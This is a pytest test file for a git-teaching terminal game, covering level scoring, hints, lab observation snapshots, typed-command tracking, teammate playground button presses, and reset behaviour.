    def recording_check(lab: kit.Lab, state: kit.State, answer: str | None, typed: kit.Typed) -> kit.Verdict:
        seen.append(answer)
        return kit.Verdict(False, "no")

    level = dataclasses.replace(sample_level, check=recording_check)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    game.check("  \t", auto=False)
    game.check("", auto=False)
    game.check(" main ", auto=False)
    assert seen == [None, None, " main "]


def secret_is_main(lab: kit.Lab, state: kit.State, answer: str | None, typed: kit.Typed = ()) -> kit.Verdict:
    """
    Check an answer the way levels compare secret answers, with `kit.answer_is` (which encodes it).

    Parameters
    ----------
    lab : kit.Lab
        The lab.
    state : kit.State
        The level state.
    answer : str | None
        The answer.
    typed : kit.Typed
        The lines typed (unused), so it serves as the level's check too.

    Returns
    -------
    kit.Verdict
        Whether the answer is ``main``.
    """
    right = kit.answer_is(answer, kit.digest("main"))
    return kit.Verdict(right, "Right." if right else "No.")


def test_text_the_player_sends_that_utf8_cannot_encode_is_only_a_wrong_answer(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    secret_step = kit.AnswerStep(id="secret", text="Which branch?", question="Which?", check=secret_is_main)
    level = dataclasses.replace(sample_level, check=secret_is_main, quest=(secret_step,))
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    for garbage in ["\ud800", "main\udfff", "\udcff" * 3]:
        assert game.check(garbage, auto=False)["solved"] is False
        assert game.quest_step(garbage)["correct"] is False
        assert game.answer_card("basics-text", garbage)["correct"] is False
        assert game.answer_card("basics-c01", garbage)["correct"] is False
    assert game.quest_step("main")["correct"] is True


def test_text_the_player_sends_reaches_a_check_with_only_encodable_characters(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[str | None] = []

    def recording_check(lab: kit.Lab, state: kit.State, answer: str | None, typed: kit.Typed) -> kit.Verdict:
        seen.append(answer)
        return kit.Verdict(False, "no")

    level = dataclasses.replace(sample_level, check=recording_check)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    game.check("ma\ud800in", auto=False)
    game.check("\ud800", auto=False)
    assert seen == ["ma?in", "?"]


def test_solving_a_level_pays_once_and_records_it(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    solve(sample_level)
    result = game.check(None, auto=False)
    payout: save.Payout = {"level": "basics-sample", "xp": 100, "first_time": True, "rank_before": "Untracked", "rank_after": "Untracked"}
    assert (result["solved"], result["payout"]) == (True, payout)
    assert result["debrief"] == markup.parse("`hello.txt` is now in a commit on `trunk`.")
    progress = save.load_progress()
    assert (progress["xp"], progress["last_payout"]) == (100, payout)
    assert {key: value for key, value in progress["levels"]["basics-sample"].items() if key != "finished"} == {"xp": 100, "stars": 3, "state": {"branch": "trunk"}}
    assert save.load_active() is None
    assert lab_project(game_home).is_dir()


def setup_on(branch: str) -> runner.Setup:
    """
    Make a setup of the sample level that starts on a given branch.

    Parameters
    ----------
    branch : str
        The branch name, which goes into the state.

    Returns
    -------
    runner.Setup
        The setup.
    """

    def setup(lab: kit.Lab) -> kit.State:
        kit.git(lab.root, "init", "-q", "-b", branch, str(lab.project))
        (lab.project / "hello.txt").write_text("hello\n")
        return {"branch": branch}

    return setup


def test_a_finished_levels_page_shows_the_debrief_of_its_last_play(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    game.start(sample_level.id)
    solve(sample_level)
    game.check(None, auto=False)
    assert game.level(sample_level.id)["debrief"] == markup.parse("`hello.txt` is now in a commit on `trunk`.")
    replay = dataclasses.replace(sample_level, setup=setup_on("main"))
    monkeypatch.setattr(runner, "catalogue", lambda: {replay.id: replay})
    game.start(replay.id)
    solve(replay)
    game.check(None, auto=False)
    assert game.level(replay.id)["debrief"] == markup.parse("`hello.txt` is now in a commit on `main`.")
    game.reset()
    assert game.level(replay.id)["debrief"] is None


def test_a_check_the_player_asks_for_may_solve_the_level_before_its_quest_is_done(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    solve(sample_level)
    assert game.check(None, auto=False)["solved"] is True


def test_two_checks_of_a_solved_lab_at_the_same_time_pay_once(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    def slow_check(lab: kit.Lab, state: kit.State, answer: str | None, typed: kit.Typed) -> kit.Verdict:
        time.sleep(0.2)
        return sample_level.check(lab, state, answer, typed)

    level = dataclasses.replace(sample_level, check=slow_check)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    solve(level)
    with ThreadPoolExecutor(max_workers=2) as pool:
        checks = [pool.submit(game.check, None, auto=False) for _ in range(2)]
    errors = [type(check.exception()) for check in checks if check.exception() is not None]
    solved = [check.result()["solved"] for check in checks if check.exception() is None]
    assert (solved, errors) == ([True], [game.NotPlayingError])
    assert save.load_progress()["xp"] == 100


def test_hints_lower_what_a_level_pays(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    game.hint()
    solve(sample_level)
    payout = game.check(None, auto=False)["payout"]
    assert payout is not None and payout["xp"] == score.level_reward(100, 1, first_time=True) == 85


def test_a_level_starts_with_no_lines_typed_and_every_star_in_play(sample_level: runner.Level, game_home: Path) -> None:
    type_lines(game_home, ("ls", 0))
    active = game.start(sample_level.id)
    assert (active["commands"], active["stars"]) == (0, 3)


def test_every_line_typed_since_the_level_started_counts_even_after_an_observation_told_it(sample_level: runner.Level, game_home: Path) -> None:
    type_lines(game_home, ("echo before", 0))
    game.start(sample_level.id)
    game.observe()
    type_lines(game_home, ("git status", 0), ("ls", 0))
    assert game.observe()["commands"] == [{"line": "git status", "status": 0}, {"line": "ls", "status": 0}]
    type_lines(game_home, ("git add hello.txt", 0))
    assert game.observe()["commands"] == [{"line": "git add hello.txt", "status": 0}]
    assert active_record()["typed"] == [{"line": "git status", "status": 0}, {"line": "ls", "status": 0}, {"line": "git add hello.txt", "status": 0}]
    active = game.status()["active"]
    assert active is not None and active["commands"] == 3


def test_the_dashboard_counts_lines_typed_since_the_last_observation_without_saving_them(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    type_lines(game_home, ("ls", 0), ("ls -a", 0))
    active = game.status()["active"]
    assert active is not None and active["commands"] == 2
    assert active_record()["typed"] == []


def test_typing_more_than_par_and_three_lines_costs_a_star_while_playing(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    type_lines(game_home, *[("ls", 0)] * (sample_level.par + 3))
    active = game.status()["active"]
    assert active is not None and active["stars"] == 3
    type_lines(game_home, ("ls", 0))
    active = game.status()["active"]
    assert active is not None and (active["commands"], active["stars"]) == (sample_level.par + 4, 2)


def listed(lab: kit.Lab, state: kit.State, answer: str | None = None, typed: kit.Typed = ()) -> kit.Verdict:
    """
    Pass once the player has typed an ``ls`` that worked, as a goal that reads typed lines does.

    Parameters
    ----------
    lab : kit.Lab
        The lab (unused).
    state : kit.State
        The level state (unused).
    answer : str | None
        Ignored.
    typed : kit.Typed
        The lines typed since the level started.

    Returns
    -------
    kit.Verdict
        Whether ``ls`` was typed and worked.
    """
    seen = kit.typed(typed, r"ls\b", "ok")
    return kit.Verdict(seen, "Listed." if seen else "Type `ls`.")


def test_a_goal_sees_every_line_typed_since_the_level_started_without_an_observation(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    step = kit.WatchStep(id="look", text="Look.", watch=lambda lab, state, typed: listed(lab, state, None, typed))
    level = dataclasses.replace(sample_level, quest=(step,), check=listed)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    type_lines(game_home, ("ls", 0))
    game.start(level.id)
    assert game.quest_step(None)["correct"] is False
    assert game.check(None, auto=False)["solved"] is False
    type_lines(game_home, ("ls", 0))
    assert game.quest_step(None)["correct"] is True
    assert game.check(None, auto=True)["solved"] is True


def test_an_unsolved_check_earns_no_stars_and_no_card(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    result = game.check(None, auto=False)
    assert (result["solved"], result["stars"], result["new_card"]) == (False, 0, None)


def test_a_first_solve_earns_its_stars_and_the_levels_card(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    game.hint()
    type_lines(game_home, *[("git status", 0)] * (sample_level.par + 4))
    solve(sample_level)
    result = game.check(None, auto=True)
    assert (result["solved"], result["stars"]) == (False, 0)
    result = game.check(None, auto=False)
    assert (result["solved"], result["stars"]) == (True, 1)
    assert result["new_card"] == game.level(sample_level.id)["card"]


def test_a_replay_keeps_the_best_stars_and_brings_no_new_card(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    game.start(sample_level.id)
    game.hint()
    solve(sample_level)
    assert game.check(None, auto=False)["stars"] == 2
    replay = dataclasses.replace(sample_level, setup=setup_on("main"))
    monkeypatch.setattr(runner, "catalogue", lambda: {replay.id: replay})
    game.start(replay.id)
    solve(replay)
    result = game.check(None, auto=False)
    assert (result["stars"], result["new_card"]) == (3, None)
    assert save.load_progress()["levels"]["basics-sample"]["stars"] == 3
    game.start(replay.id)
    game.hint()
    solve(replay)
    assert game.check(None, auto=False)["stars"] == 2
    assert save.load_progress()["levels"]["basics-sample"]["stars"] == 3


def test_a_replay_pays_nothing_and_keeps_the_first_finish_and_payment(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    game.start(sample_level.id)
    solve(sample_level)
    game.check(None, auto=False)
    first = save.load_progress()["levels"]["basics-sample"]
    replay = dataclasses.replace(sample_level, setup=setup_on("main"))
    monkeypatch.setattr(runner, "catalogue", lambda: {replay.id: replay})
    game.start(replay.id)
    solve(replay)
    payout = game.check(None, auto=False)["payout"]
    assert payout == {"level": "basics-sample", "xp": 0, "first_time": False, "rank_before": "Untracked", "rank_after": "Untracked"}
    assert save.load_progress()["levels"]["basics-sample"] == {**first, "stars": 3, "state": {"branch": "main"}}
    assert save.load_progress()["xp"] == 100


def test_a_payout_tells_the_rank_before_and_after(sample_level: runner.Level) -> None:
    save.write_progress({**save.new_progress(), "xp": 100})
    game.start(sample_level.id)
    solve(sample_level)
    payout = game.check(None, auto=False)["payout"]
    assert payout is not None and (payout["rank_before"], payout["rank_after"]) == ("Untracked", "Staged")
    assert game.status()["last_payout"] == payout


def test_hints_are_revealed_in_order_and_each_costs_its_share(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    first = game.hint()
    second = game.hint()
    assert (first["hint"], first["used"], first["total"], first["cost"]) == (markup.parse(sample_level.hints[0]), 1, 3, 15)
    assert (second["hint"], second["used"], second["cost"]) == (markup.parse(sample_level.hints[1]), 2, 15)


def test_asking_for_a_hint_after_the_last_one_shows_it_again_for_free(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    for _ in sample_level.hints:
        game.hint()
    again = game.hint()
    assert (again["hint"], again["used"], again["cost"]) == (markup.parse(sample_level.hints[-1]), 3, 0)
    assert active_record()["hints"] == 3


def test_hints_cost_nothing_on_a_replay(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    solve(sample_level)
    game.check(None, auto=False)
    game.start(sample_level.id)
    assert game.hint()["cost"] == 0


@pytest.mark.usefixtures("fake_insight")
def test_observing_the_lab_snapshots_it_and_tells_what_changed(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    first = game.observe()
    assert (first["level"], first["github"], first["events"]) == ("basics-sample", None, [])
    assert [entry["path"] for entry in first["project"]["files"]] == ["hello.txt"]
    (lab_project(game_home) / "notes.txt").write_text("x")
    second = game.observe()
    assert second["events"] == [
        {
            "kind": "file-created",
            "text": [{"kind": "para", "spans": [{"text": "notes.txt", "code": True}, {"text": " appeared.", "code": False}]}],
        }
    ]
    assert game.observe()["events"] == []


def test_observing_a_real_lab_tells_of_the_staging_and_the_commit(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    first = game.observe()
    assert (first["project"]["exists"], first["project"]["branch"], first["github"], first["events"]) == (True, "trunk", None, [])
    assert [(entry["path"], entry["index"], entry["folder"]) for entry in first["project"]["files"]] == [("hello.txt", None, HELLO_BLOB)]
    kit.git(lab_project(game_home), "add", "hello.txt")
    assert [event["kind"] for event in game.observe()["events"]] == ["file-staged"]
    kit.git(lab_project(game_home), "commit", "-q", "-m", "Say hello")
    short = kit.git(lab_project(game_home), "rev-parse", "--short", "HEAD").strip()
    events = game.observe()["events"]
    assert any(event["kind"] == "commit-created" and short in plain(event["text"]) for event in events), events


def test_an_observation_saved_by_an_older_game_is_dropped_without_events_or_error(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    game.observe()
    observed = json.loads((game_home / "observed.json").read_text())
    for entry in observed["project"]["files"]:
        del entry["repository"]
    (game_home / "observed.json").write_text(json.dumps(observed))
    (lab_project(game_home) / "notes.txt").write_text("x")
    assert game.observe()["events"] == []
    assert game.observe()["events"] == []


@pytest.mark.usefixtures("fake_insight")
def test_a_stale_or_damaged_observation_is_dropped_without_events_or_error(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    (game_home / "observed.json").write_text(json.dumps({"level": "basics-sample", "project": {"files": "an older shape"}}))
    assert game.observe()["events"] == []
    observed = save.load_observed()
    assert observed is not None and observed["project"]["exists"] is True


@pytest.mark.usefixtures("fake_insight")
def test_observing_an_unchanged_lab_does_not_rewrite_the_observation(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    game.observe()
    observed = game_home / "observed.json"
    long_ago = observed.stat().st_mtime_ns - 10**10
    os.utime(observed, ns=(long_ago, long_ago))
    game.observe()
    assert observed.stat().st_mtime_ns == long_ago


@pytest.mark.usefixtures("fake_insight")
def test_observing_a_lab_with_a_stand_in_github_snapshots_it_too(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    github = game_home / "labs" / "basics-sample" / "github" / "project.git"
    github.mkdir(parents=True)
    first = game.observe()
    assert first["github"] is not None and first["github"]["exists"] is True
    (github / "pushed").write_text("x")
    assert [(event["kind"], plain(event["text"])) for event in game.observe()["events"]] == [("file-created", "pushed appeared.")]


@pytest.mark.usefixtures("fake_insight")
def test_starting_a_level_forgets_the_last_observation(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    (lab_project(game_home) / "notes.txt").write_text("x")
    game.observe()
    game.start(sample_level.id)
    assert not (game_home / "observed.json").exists()
    assert game.observe()["events"] == []




def test_the_games_shell_is_bash_with_the_games_own_startup_file(game_home: Path) -> None:
    startup = game_home / save.STARTUP_FILE
    assert game.shell_command() == ["bash", "--noprofile", "--rcfile", str(startup), "-i"]
    assert startup.read_text() == commands.startup(game_home / save.COMMANDS_FILE, game_home / save.HISTORY_FILE)


def test_observing_tells_the_commands_typed_since_the_last_observation_once(sample_level: runner.Level, typist: Callable[..., bytes]) -> None:
    game.start(sample_level.id)
    shell, env, folder = game.shell_command(), game.shell_environment(terminal.player_env(os.environ)), Path(game.terminal_folder())
    typist(shell, env, folder, [(b"git status --short\n", b"$ ")])
    assert game.observe()["commands"] == []
    typist(shell, env, folder, [(b"git add hello.txt\n", b"$ "), (b"git commit -q -m Hello\n", b"$ ")])
    observed = game.observe()
    assert observed["commands"] == [{"line": "git add hello.txt", "status": 0}, {"line": "git commit -q -m Hello", "status": 128}]
    assert [event["kind"] for event in observed["events"]] == ["file-staged"]
    assert game.observe()["commands"] == []



def test_observing_reacts_to_each_typed_line_rama_has_something_to_say_about_with_the_levels_rules_first(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    game.observe()
    kit.git(lab_project(game_home), "add", "hello.txt")
    type_lines(game_home, ("ls", 0), ("true", 0), ("git add hello.txt", 0))
    assert game.observe()["reactions"] == [
        {"line": "ls", "mood": "info", "text": markup.parse(reactions.LS_IN_REPOSITORY)},
        {"line": "git add hello.txt", "mood": "ok", "text": markup.parse("Hello is staged.")},
    ]
    assert game.observe()["reactions"] == []


def test_the_first_observation_of_a_level_tells_no_lines_and_no_reactions(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    type_lines(game_home, ("ls", 0))
    first = game.observe()
    assert (first["commands"], first["reactions"]) == ([], [])
    assert active_record()["typed"] == [{"line": "ls", "status": 0}]


def write_note(lab: kit.Lab, state: kit.State) -> None:
    """
    Write a file in the project, as a staged scenario does.

    Parameters
    ----------
    lab : kit.Lab
        The lab.
    state : kit.State
        The level's state (unused).
    """
    with (lab.project / "note.txt").open("a") as handle:
        handle.write("x")


def with_events(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch, *events: kit.LevelEvent) -> runner.Level:
    """
    Make the catalogue hold the sample level with some level events.

    Parameters
    ----------
    sample_level : runner.Level
        The sample level.
    monkeypatch : pytest.MonkeyPatch
        Pytest's patcher.
    *events : kit.LevelEvent
        Its events.

    Returns
    -------
    runner.Level
        The level.
    """
    level = dataclasses.replace(sample_level, events=events)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    return level


def test_an_event_runs_once_right_after_the_first_observation_so_the_next_one_tells_its_change(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    level = with_events(sample_level, monkeypatch, kit.LevelEvent(id="arrive", run=write_note))
    game.start(level.id)
    first = game.observe()
    assert [entry["path"] for entry in first["project"]["files"]] == ["hello.txt"]
    assert (lab_project(game_home) / "note.txt").read_text() == "x"
    assert [event["kind"] for event in game.observe()["events"]] == ["file-created"]
    (game_home / "observed.json").unlink()
    game.observe()
    game.observe()
    assert (lab_project(game_home) / "note.txt").read_text() == "x"
    assert active_record()["events"] == ["arrive"]


def test_an_event_on_a_goal_runs_once_when_that_goal_is_reached(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    level = with_events(sample_level, monkeypatch, kit.LevelEvent(id="after-stage", run=write_note, goal="stage"))
    game.start(level.id)
    game.observe()
    game.quest_step(None)
    assert not (lab_project(game_home) / "note.txt").exists()
    kit.git(lab_project(game_home), "add", "hello.txt")
    assert game.quest_step(None)["correct"] is True
    assert (lab_project(game_home) / "note.txt").read_text() == "x"
    assert "file-created" in [event["kind"] for event in game.observe()["events"]]
    game.quest_step("trunk")
    assert (lab_project(game_home) / "note.txt").read_text() == "x"


def test_starting_again_runs_the_events_again(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    level = with_events(sample_level, monkeypatch, kit.LevelEvent(id="arrive", run=write_note))
    game.start(level.id)
    game.observe()
    game.start(level.id)
    assert active_record()["events"] == []
    game.observe()
    assert (lab_project(game_home) / "note.txt").read_text() == "x"


def test_observing_reads_the_typed_commands_before_the_snapshots_so_their_changes_are_in_them(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    game.start(sample_level.id)
    game.observe()
    calls: list[str] = []
    real_since, real_snapshot = commands.since, repomap.snapshot

    def reading(log: Path, offset: int) -> tuple[list[records.Command], int]:
        calls.append("log")
        return real_since(log, offset)

    def snapshotting(path: Path) -> repomap.Snapshot:
        calls.append("snapshot")
        return real_snapshot(path)

    monkeypatch.setattr(commands, "since", reading)
    monkeypatch.setattr(repomap, "snapshot", snapshotting)
    game.observe()
    assert calls == ["log", "snapshot"]

def test_a_press_tells_the_commands_typed_before_it_in_its_before_observation(playground_level: runner.Level, typist: Callable[..., bytes]) -> None:
    game.start(playground_level.id)
    game.observe()
    shell, env, folder = game.shell_command(), game.shell_environment(terminal.player_env(os.environ)), Path(game.terminal_folder())
    typist(shell, env, folder, [(b"git status --short\n", b"$ ")])
    pressed = game.press("you", "status")
    assert (pressed["before"]["commands"], pressed["observation"]["commands"]) == ([{"line": "git status --short", "status": 0}], [])
    assert game.observe()["commands"] == []


def test_observing_a_level_without_a_playground_has_no_teammate(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    observation = game.observe()
    assert (observation["teammate"], observation["teammate_events"], observation["buttons"]) == (None, [], {})


def test_observing_a_playground_snapshots_alexs_clone_and_tells_its_changes_apart(playground_level: runner.Level, game_home: Path) -> None:
    game.start(playground_level.id)
    first = game.observe()
    assert first["teammate"] is not None and first["teammate"]["branch"] == "main"
    assert first["teammate_events"] == []
    (game_home / "labs" / playground_level.id / "teammate" / "project" / "todo.txt").write_text("x")
    second = game.observe()
    assert ([event["kind"] for event in second["teammate_events"]], second["events"]) == (["file-created"], [])
    assert "todo.txt" in plain(second["teammate_events"][0]["text"])



def test_a_teammates_clone_removed_from_the_terminal_leaves_no_playground(playground_level: runner.Level, game_home: Path) -> None:
    game.start(playground_level.id)
    game.observe()
    teammate = runner.lab_of(playground_level.id).teammate
    sandbox.remove_tree(teammate, game_home)
    after = game.observe()
    assert (after["teammate"], after["teammate_events"]) == (None, [])
    with pytest.raises(game.NoPlaygroundError):
        game.press("alex", "status")

def test_each_press_runs_in_the_clone_of_the_person_who_pressed(playground_level: runner.Level) -> None:
    game.start(playground_level.id)
    game.observe()
    yours = game.press("you", "edit:notes.txt")["observation"]
    assert ([event["kind"] for event in yours["events"]], yours["teammate_events"]) == (["file-changed"], [])
    alexs = game.press("alex", "edit:notes.txt")["observation"]
    assert (alexs["events"], [event["kind"] for event in alexs["teammate_events"]]) == ([], ["file-changed"])
    assert alexs["teammate"] is not None
    for snap in (alexs["project"], alexs["teammate"]):
        assert [(entry["path"], entry["folder_change"]) for entry in snap["files"]] == [("README.md", None), ("notes.txt", "modified")]


def test_a_press_gives_the_command_as_the_player_could_type_it_and_what_git_printed(playground_level: runner.Level) -> None:
    game.start(playground_level.id)
    pressed = game.press("alex", "commit")
    press = pressed["press"]
    assert (press["person"], press["button"], press["command"], press["status"]) == ("alex", "commit", 'git commit -m "Save my work"', 1)
    assert "nothing to commit" in press["output"]
    assert (pressed["explanation"], pressed["fix"], pressed["fix_line"]) == (markup.parse(explanations.EXPLANATIONS["E9"]), None, "")


def test_a_refused_press_comes_with_its_explanation_and_its_fix(playground_level: runner.Level) -> None:
    game.start(playground_level.id)
    game.press("alex", "edit:notes.txt")
    unstaged = game.press("alex", "commit")
    assert (unstaged["press"]["status"], unstaged["fix"], unstaged["fix_line"]) == (1, "add:notes.txt", "")
    assert unstaged["explanation"] == markup.parse(explanations.EXPLANATIONS["E8"])
    game.press("you", "edit:notes.txt")
    game.press("you", "add:notes.txt")
    nameless = game.press("you", "commit")
    assert (nameless["press"]["status"], nameless["fix"], nameless["fix_line"]) == (128, None, explanations.NAME_LINE)
    assert nameless["explanation"] == markup.parse(explanations.EXPLANATIONS["E10"])


def test_a_press_that_works_needs_no_explanation(playground_level: runner.Level) -> None:
    game.start(playground_level.id)
    pressed = game.press("alex", "status")
    assert (pressed["press"]["status"], pressed["explanation"], pressed["fix"], pressed["fix_line"]) == (0, None, None, "")


def test_what_a_press_changed_is_told_once_and_observing_then_sees_the_same_lab(playground_level: runner.Level) -> None:
    game.start(playground_level.id)
    game.observe()
    pressed = game.press("alex", "edit:notes.txt")["observation"]
    again = game.observe()
    assert (again["project"], again["github"], again["teammate"], again["buttons"]) == (pressed["project"], pressed["github"], pressed["teammate"], pressed["buttons"])
    assert (again["events"], again["teammate_events"]) == ([], [])


def test_a_press_tells_what_the_terminal_changed_before_it_apart_from_its_own_changes(playground_level: runner.Level, game_home: Path) -> None:
    game.start(playground_level.id)
    game.observe()
    (game_home / "labs" / playground_level.id / "teammate" / "project" / "todo.txt").write_text("x")
    pressed = game.press("you", "edit:notes.txt")
    before, after = pressed["before"], pressed["observation"]
    assert (before["events"], [event["kind"] for event in before["teammate_events"]]) == ([], ["file-created"])
    assert ([event["kind"] for event in after["events"]], after["teammate_events"]) == (["file-changed"], [])
    assert before["teammate"] == after["teammate"]
    assert [entry["folder_change"] for entry in before["project"]["files"]] == [None, None]


def test_a_press_that_does_not_finish_saves_nothing_so_the_next_observation_tells_the_typed_changes(playground_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    game.start(playground_level.id)
    game.observe()
    (game_home / "labs" / playground_level.id / "teammate" / "project" / "todo.txt").write_text("x")

    def hanging(lab: kit.Lab, person: records.Who, button: str) -> records.Press:
        raise subprocess.TimeoutExpired(["git", "push"], gitcmd.TIMEOUT)

    monkeypatch.setattr(playground, "press", hanging)
    with pytest.raises(subprocess.TimeoutExpired):
        game.press("alex", "push")
    assert [event["kind"] for event in game.observe()["teammate_events"]] == ["file-created"]


@pytest.mark.slow
def test_a_push_from_alex_is_told_among_the_events_of_github(playground_level: runner.Level) -> None:
    game.start(playground_level.id)
    for button in ["edit:notes.txt", "add:notes.txt", "commit"]:
        game.press("alex", button)
    pushed = game.press("alex", "push")
    assert pushed["press"]["status"] == 0
    assert "push-received" in [event["kind"] for event in pushed["observation"]["events"]]


def test_a_press_runs_and_snapshots_the_lab_while_holding_the_save_lock(playground_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    game.start(playground_level.id)
    held: list[tuple[str, bool]] = []
    real_press, real_snapshot = playground.press, repomap.snapshot

    def pressing(lab: kit.Lab, person: records.Who, button: str) -> records.Press:
        held.append(("press", lock_is_held(game_home)))
        return real_press(lab, person, button)

    def snapshotting(path: Path) -> repomap.Snapshot:
        held.append(("snapshot", lock_is_held(game_home)))
        return real_snapshot(path)

    monkeypatch.setattr(playground, "press", pressing)
    monkeypatch.setattr(repomap, "snapshot", snapshotting)
    game.press("you", "status")
    # The press reads the person's clone to choose its line (one snapshot), then the lab is read again.
    assert held == [("snapshot", True)] * 3 + [("press", True)] + [("snapshot", True)] * 4


def test_pressing_needs_a_level_with_a_playground(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    with pytest.raises(game.NoPlaygroundError, match="playground"):
        game.press("you", "edit:notes.txt")
    assert not (lab_project(game_home) / "notes.txt").exists()



@pytest.mark.slow
def test_each_person_gets_the_buttons_of_their_own_clone(playground_level: runner.Level) -> None:
    game.start(playground_level.id)
    lab = runner.lab_of(playground_level.id)
    gitcmd.output(lab.project, "config", "--global", "user.name", "Sam Lee")
    gitcmd.output(lab.project, "config", "--global", "user.email", "sam@example.com")
    first = game.observe()["buttons"]
    assert list(first) == ["you", "alex"]
    assert all(button["off"] == "" for bar in first.values() for button in bar)
    for person, button in [("alex", "edit:notes.txt"), ("alex", "add:notes.txt"), ("alex", "commit"), ("alex", "push"), ("you", "edit:README.md"), ("you", "add:README.md"), ("you", "commit"), ("you", "fetch")]:
        assert game.press(person, button)["press"]["status"] == 0, (person, button)
    bars = game.observe()["buttons"]
    assert "pull-no-rebase" in [button["id"] for button in bars["you"]]
    assert "pull-no-rebase" not in [button["id"] for button in bars["alex"]]


@pytest.mark.slow
def test_a_press_shows_the_buttons_before_and_after_it(playground_level: runner.Level) -> None:
    game.start(playground_level.id)
    lab = runner.lab_of(playground_level.id)
    gitcmd.output(lab.project, "config", "--global", "user.name", "Sam Lee")
    gitcmd.output(lab.project, "config", "--global", "user.email", "sam@example.com")
    for person, button in [("alex", "edit:notes.txt"), ("alex", "add:notes.txt"), ("alex", "commit"), ("alex", "push"), ("you", "edit:README.md"), ("you", "add:README.md"), ("you", "commit")]:
        game.press(person, button)
    pressed = game.press("you", "fetch")
    assert "pull-no-rebase" not in [button["id"] for button in pressed["before"]["buttons"]["you"]]
    assert "pull-no-rebase" in [button["id"] for button in pressed["observation"]["buttons"]["you"]]
    assert pressed["observation"]["buttons"] == game.observe()["buttons"]


def test_a_button_that_is_off_runs_nothing_and_says_why(playground_level: runner.Level) -> None:
    game.start(playground_level.id)
    game.observe()
    notes = runner.lab_of(playground_level.id).teammate / "notes.txt"
    notes.unlink()
    notes.mkdir()
    with pytest.raises(game.ButtonOffError) as raised:
        game.press("alex", "edit:notes.txt")
    assert list(notes.iterdir()) == []
    after = game.observe()
    [view] = [button for button in after["buttons"]["alex"] if button["id"] == "edit:notes.txt"]
    assert view["off"] == str(raised.value) != ""
    assert "file-deleted" in [event["kind"] for event in after["teammate_events"]]


@pytest.mark.parametrize(("person", "button"), [("bob", "status"), ("You", "status"), ("alex", "rebase"), ("alex", ""), ("alex", "edit"), ("you", "edit:../x")])
def test_an_unknown_person_or_button_is_an_unknown_id_before_anything_else(person: str, button: str) -> None:
    with pytest.raises(game.UnknownIdError, match="playground"):
        game.press(person, button)


def test_aborting_ends_the_level_and_removes_its_lab(sample_level: runner.Level, game_home: Path) -> None:
    assert game.abort() is None
    game.start(sample_level.id)
    game.observe()
    assert game.abort() == "basics-sample"
    assert save.load_active() is None
    assert not (game_home / "labs").exists()
    assert not (game_home / "observed.json").exists()


def test_reset_erases_all_progress_and_restores_the_base_git_config(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    solve(sample_level)
    game.check(None, auto=False)
    game.start(sample_level.id)
    (game_home / "gitconfig").write_text("[user]\n\tname = Ada\n")
    game.reset()
    assert save.load_progress() == save.new_progress()
    assert save.load_active() is None
    assert not (game_home / "labs").exists()
    assert (game_home / "gitconfig").read_text() == gitcmd.BASE_CONFIG


def test_reset_works_on_a_damaged_save(sample_level: runner.Level, game_home: Path) -> None:
    (game_home / "progress.json").write_text("{damaged")
    (game_home / "active.json").write_text('{"level": 3}')
    game.reset()
    assert game.status()["xp"] == 0


def test_a_new_player_has_cards_to_review_only_in_the_chapter_they_ask_for(sample_level: runner.Level) -> None:
    assert game.due_cards(None, 50) == []
    picked = game.due_cards("basics", 50)
    assert len(picked) == 12
    assert [card["level"] for card in picked] == sorted(card["level"] for card in picked)
    assert all(card["pays"] for card in picked)


def test_new_cards_come_from_chapters_with_a_finished_level(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    solve(sample_level)
    game.check(None, auto=False)
    picked = game.due_cards(None, 50)
    assert {card["chapter"] for card in picked} == {"basics"}
    assert game.status()["cards_due"] == 12


